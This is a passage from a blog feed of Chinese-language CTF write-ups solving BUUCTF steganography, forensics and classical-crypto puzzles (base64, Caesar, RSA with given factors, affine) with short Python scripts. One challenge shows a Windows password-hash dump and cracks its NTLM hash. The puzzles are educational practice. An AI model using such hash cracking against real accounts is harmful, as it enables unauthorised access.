class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ exiftool &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;4.png</span><br><span class="line">ExifTool Version Number         : 12.07</span><br><span class="line">File Name                       : 4.png</span><br><span class="line">Directory                       : &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady</span><br><span class="line">File Size                       : 63 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2019:10:19 18:50:30+08:00</span><br><span class="line">File Access Date&#x2F;Time           : 2020:11:05 21:06:05+08:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2020:11:05 21:06:05+08:00</span><br><span class="line">File Permissions                : rw-------</span><br><span class="line">File Type                       : PNG</span><br><span class="line">File Type Extension             : png</span><br><span class="line">MIME Type                       : image&#x2F;png</span><br><span class="line">Image Width                     : 145</span><br><span class="line">Image Height                    : 263</span><br><span class="line">Bit Depth                       : 8</span><br><span class="line">Color Type                      : RGB</span><br><span class="line">Compression                     : Deflate&#x2F;Inflate</span><br><span class="line">Filter                          : Adaptive</span><br><span class="line">Interlace                       : Noninterlaced</span><br><span class="line">Pixels Per Unit X               : 2835</span><br><span class="line">Pixels Per Unit Y               : 2835</span><br><span class="line">Pixel Units                     : meters</span><br><span class="line">Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)</span><br><span class="line">Artist                          : another part:cExlX1BsY</span><br><span class="line">Image Size                      : 145x263</span><br><span class="line">Megapixels                      : 0.038</span><br></pre></td></tr></table></figure><p>第五张图片。</p><p><code>strings</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.png &#x3D;&gt; Yzcllfc0lN</span><br></pre></td></tr></table></figure><h3 id="Business-Planning-Group"><a href="#Business-Planning-Group" class="headerlink" title="Business Planning Group"></a>Business Planning Group</h3><p>bpg图片，直接搜索PNG尾部<code>42 60 82</code>，接下来是bpg的头部，截取下来。使用<code>Honeyview</code>，打开。</p><p>打开之后拿到base64解码，拿到flag。</p><h3 id="我爱Linux"><a href="#我爱Linux" class="headerlink" title="我爱Linux"></a>我爱Linux</h3><p>python序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle  </span><br><span class="line"></span><br><span class="line">fp &#x3D; open(&quot;2.txt&quot;,&quot;rb+&quot;)      &#39;&#39;&#39; 打开序列化文件 &#39;&#39;&#39;</span><br><span class="line">fw &#x3D; open(&#39;pickle.txt&#39;, &#39;w&#39;)  &#39;&#39;&#39; 打开保存文件 &#39;&#39;&#39;</span><br><span class="line">a&#x3D;pickle.load(fp)             &#39;&#39;&#39; 反序列化文件编译 &#39;&#39;&#39;</span><br><span class="line">pickle&#x3D;str(a)                 &#39;&#39;&#39; 转换成字符串要不然不能保存 &#39;&#39;&#39;</span><br><span class="line">fw.write( pickle )            &#39;&#39;&#39; 写入文件 &#39;&#39;&#39;</span><br><span class="line">fw.close()                    &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39;</span><br><span class="line">fp.close()                    &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39;</span><br></pre></td></tr></table></figure><p>第一个是坐标，第二个是内容。画图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">fw = open(<span class="string">&quot;pickle.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">text=fw.read( )</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;len(text)+<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(text[i]==<span class="string">&#x27;]&#x27;</span>):</span><br><span class="line">       print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">       a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span>(text[i]==<span class="string">&#x27;(&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(text[i+<span class="number">2</span>]==<span class="string">&#x27;,&#x27;</span>):</span><br><span class="line">            b=text[i+<span class="number">1</span>]</span><br><span class="line">            d=text[i+<span class="number">1</span>]</span><br><span class="line">            b=int(b)-int(a)</span><br><span class="line">            c=<span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> c&lt;b:</span><br><span class="line">                print(<span class="string">&quot; &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                c += <span class="number">1</span></span><br><span class="line">            print(text[i+<span class="number">5</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            a=int(d)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b=text[i+<span class="number">1</span>]+text[i+<span class="number">2</span>]</span><br><span class="line">            d=text[i+<span class="number">1</span>]+text[i+<span class="number">2</span>]</span><br><span class="line">            b=int(b)-int(a)</span><br><span class="line">            c=<span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> c&lt;b:</span><br><span class="line">                print(<span class="string">&quot; &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                c += <span class="number">1</span></span><br><span class="line">            print(text[i+<span class="number">6</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            a=int(d)</span><br><span class="line">    i +=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h3><p>一个音频，打开之后没有发现什么东西。尝试binwalk。分离不出东西。尝试隐写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ steghide extract -sf out.wav</span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to <span class="string">&quot;download.txt&quot;</span>.</span><br></pre></td></tr></table></figure><p>拿到一个下载链接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;share.weiyun.com&#x2F;5wVTIN3</span><br></pre></td></tr></table></figure><p>一个PNG文件，修复头部，图片是unicode，编码使用小红帽编码。</p><h3 id="BSidesSF2019-diskimage"><a href="#BSidesSF2019-diskimage" class="headerlink" title="[BSidesSF2019]diskimage"></a>[BSidesSF2019]diskimage</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:&#x2F;tmp# zsteg &#39;&#x2F;tmp&#x2F;attachment (1).png&#39; --all</span><br><span class="line">b8,rgb,lsb,xy       .. file: DOS&#x2F;MBR boot sector, code offset 0x3c+2, OEM-ID &quot;~mitsumi&quot;, root entries 224, sectors 2880 (volumes &lt;&#x3D;32 MB) , sectors&#x2F;FAT 9, sectors&#x2F;track 18, serial number 0x7e572f0f, unlabeled, FAT (12 bit)</span><br></pre></td></tr></table></figure><p>导出一个fat数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:&#x2F;tmp# zsteg -a &#39;b8,rgb,lsb,xy&#39; &#39;&#x2F;tmp&#x2F;attachment (1).png&#39;  &gt;flag.dat</span><br></pre></td></tr></table></figure><h3 id="V-amp-N2020-公开赛-拉胯的三条命令"><a href="#V-amp-N2020-公开赛-拉胯的三条命令" class="headerlink" title="[V&amp;N2020 公开赛]拉胯的三条命令"></a>[V&amp;N2020 公开赛]拉胯的三条命令</h3><p>直接tcpdump</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpdump  -n -r nmapll.pcapng <span class="string">&#x27;tcp[13] = 18&#x27;</span> |  awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>| sort -u</span><br><span class="line">reading <span class="keyword">from</span> file nmapll.pcapng, link-type EN10MB (Ethernet)</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.21</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.22</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.3306</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.631</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.801</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Buuctf&quot;&gt;&lt;a href=&quot;#Buuctf&quot; class=&quot;headerlink&quot; title=&quot;Buuctf&quot;&gt;&lt;/a&gt;Buuctf&lt;/h1&gt;&lt;h2 id=&quot;杂项&quot;&gt;&lt;a href=&quot;#杂项&quot; class=&quot;headerlink&quot; title=&quot;杂项&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="CTF-杂项" scheme="http://s1eady.top/categories/CTF-%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF-杂项" scheme="http://s1eady.top/tags/CTF-%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Crypto刷题1</title>
    <link href="http://s1eady.top/2020/10/26/CTF-Crypto%E5%88%B7%E9%A2%981/"/>
    <id>http://s1eady.top/2020/10/26/CTF-Crypto%E5%88%B7%E9%A2%981/</id>
    <published>2020-10-25T18:10:16.000Z</published>
    <updated>2020-11-06T11:51:57.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-Crypto"><a href="#BUUCTF-Crypto" class="headerlink" title="BUUCTF-Crypto"></a>BUUCTF-Crypto</h1><p>MD5</p><p>直接解密得到admin1</p><p>url编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d</span><br></pre></td></tr></table></figure><p>解码得到flag</p><p>一眼就解密</p><p>下面的字符串解密后便能获得flag：ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30= 注意：得到的 flag 请包上 flag{} 提交</p><p>base64解码</p><p>看我回旋踢</p><p>synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}</p><p>rot13、凯撒尝试尝试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">steady_dic=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">steady_dic1=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">print(steady_dic1)</span><br><span class="line">steady_str=<span class="string">&quot;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&quot;</span></span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line">steady_num=<span class="number">13</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">    <span class="keyword">if</span> ord(<span class="string">&#x27;a&#x27;</span>) &lt;= ord(i) <span class="keyword">and</span> ord(i) &lt;= ord(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        num=steady_dic1.index(i)+<span class="number">1</span>+steady_num</span><br><span class="line">        <span class="keyword">if</span> num &gt; <span class="number">26</span>:</span><br><span class="line">            num=num%<span class="number">26</span></span><br><span class="line">        print(num)</span><br><span class="line">        steady_flag+=steady_dic1[num<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">elif</span> ord(<span class="string">&#x27;A&#x27;</span>) &lt;= ord(i) <span class="keyword">and</span> ord(i) &lt;= ord(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        num=steady_dic.index(i)+<span class="number">1</span>+steady_num</span><br><span class="line">        <span class="keyword">if</span> num &gt; <span class="number">26</span>:</span><br><span class="line">            num=num%<span class="number">26</span></span><br><span class="line">        print(num)</span><br><span class="line">        steady_flag+=steady_dic[num<span class="number">-1</span>]   </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        steady_flag+=i</span><br><span class="line">print(steady_flag)</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-签到-y1ng"><a href="#BJDCTF-2nd-签到-y1ng" class="headerlink" title="[BJDCTF 2nd]签到-y1ng"></a>[BJDCTF 2nd]签到-y1ng</h2><p>welcome to BJDCTF<br>1079822948</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64编码</p><h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>姓名：张三<br>生日：19900315</p><p>key格式为key{xxxxxxxxxx}</p><h2 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afZ_r9VYfScOeO_UL^RWUc</span><br></pre></td></tr></table></figure><p>每一个字符的唯一不一样，第一个位移为5，依次加一。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">start=<span class="number">5</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(steady_str)):</span><br><span class="line">    print(steady_str[i])</span><br><span class="line">    flag+=chr(ord(steady_str[i])+start)</span><br><span class="line">    start+=<span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E4&#x3D;B9&#x3D;9F&#x3D;E5&#x3D;BE&#x3D;88&#x3D;E6&#x3D;A3&#x3D;92&#x3D;E5&#x3D;93&#x3D;A6</span><br></pre></td></tr></table></figure><p>直接解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那你也很棒哦</span><br></pre></td></tr></table></figure><h2 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h2><p>Rabbit解密，有些时候需要密钥。此编码与和base64很相似。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI</span><br></pre></td></tr></table></figure><h2 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">felhaagv&#123;ewtehtehfilnakgw&#125;</span><br></pre></td></tr></table></figure><p>篱笆==栅栏</p><h2 id="丢失的md5"><a href="#丢失的md5" class="headerlink" title="丢失的md5"></a>丢失的md5</h2><p>直接跑出md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            m=hashlib.md5()</span><br><span class="line">            m.update(<span class="string">&#x27;TASC&#x27;</span>+chr(i)+<span class="string">&#x27;O3RJMV&#x27;</span>+chr(j)+<span class="string">&#x27;WDJKX&#x27;</span>+chr(k)+<span class="string">&#x27;ZM&#x27;</span>)</span><br><span class="line">            des=m.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;e9032&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;da&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;911513&#x27;</span> <span class="keyword">in</span> des:</span><br><span class="line">                <span class="keyword">print</span> des</span><br></pre></td></tr></table></figure><h2 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h2><p>分解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line">N=<span class="number">98554799767</span></span><br><span class="line">factor=FactorDB(N)</span><br><span class="line">factor.connect()</span><br><span class="line">factor_list=factor.get_factor_list()</span><br><span class="line">print(factor_list)</span><br></pre></td></tr></table></figure><p>进行md5加密。</p><h2 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h2><p>常规脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">n=q*p</span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line">m=pow(int(c),d,n)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>直接求d</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">p &#x3D;  473398607161</span><br><span class="line">q &#x3D;  4511491</span><br><span class="line">e &#x3D;  17</span><br><span class="line">c &#x3D;  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line">n&#x3D;q*p</span><br><span class="line">phin &#x3D; (p - 1) * (q - 1)</span><br><span class="line">d&#x3D;gmpy2.invert(e, phin)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><h2 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h2><p>公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。<br>以下密文被解开后可以获得一个有意义的单词：FRPHEVGL<br>你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。</p><p>ComeChina</p><h2 id="Windows系统密码"><a href="#Windows系统密码" class="headerlink" title="Windows系统密码"></a>Windows系统密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</span><br></pre></td></tr></table></figure><p><code>a7fcb22a88038f35a8f39d503e7f0062</code>md5解密。</p><h2 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h2><p>十六进制解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = input(<span class="string">&quot;输入要转成字符串的16进制(输入空字符串退出)：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">2</span>):</span><br><span class="line">                j = s[i]+s[i+<span class="number">1</span>]</span><br><span class="line">                k+=chr(int(j,<span class="number">16</span>))</span><br><span class="line">                print(k)</span><br><span class="line">        <span class="keyword">except</span>  Exception <span class="keyword">as</span> err:</span><br><span class="line">            print(<span class="string">&quot;输入有误：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            print(err)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = input(<span class="string">&quot;输入要转成16进制的字符串(输入空字符串退出)：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            k+=str(hex(ord(i)))</span><br><span class="line">        k= k.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(k)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">     print(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">*****************************************</span></span><br><span class="line"><span class="string">*             1.字符串转16进制                          *</span></span><br><span class="line"><span class="string">*             2.16进制转字符串                         *</span></span><br><span class="line"><span class="string">*****************************************</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:     </span><br><span class="line">        k = input(<span class="string">&quot;请输入要使用功能的序号：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> k==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            str_to_hex()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            hex_to_str()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;输入有误请重新输入！！！&quot;</span>)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; </span><br></pre></td></tr></table></figure><p>发现flag不对，前面有一个yanzi，应该是个密钥，尝试维吉尼亚解密。</p><h2 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h2><p>根据甲子表，拿到对应的ascii<code>XZSDMFLZ</code>，然后栅栏，拿到四栅栅栏，进行凯撒解密，拿到flag。</p><h2 id="GKCTF2020-小学生的密码学"><a href="#GKCTF2020-小学生的密码学" class="headerlink" title="[GKCTF2020]小学生的密码学"></a>[GKCTF2020]小学生的密码学</h2><p>e(x)=11x+6(mod26) 密文：welcylk </p><p>flag为base64形式</p><p>仿设加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string  <span class="comment">#affine</span></span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line">s = <span class="string">&#x27;welcylk&#x27;</span></span><br><span class="line">s1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">len =len(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len):</span><br><span class="line">    a=(<span class="number">19</span>*(ord(s[i])<span class="number">-97</span><span class="number">-6</span>))%<span class="number">26</span></span><br><span class="line">    s1+=chr(a+<span class="number">97</span>)</span><br><span class="line">print(base64.b64encode(s1))</span><br></pre></td></tr></table></figure><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span 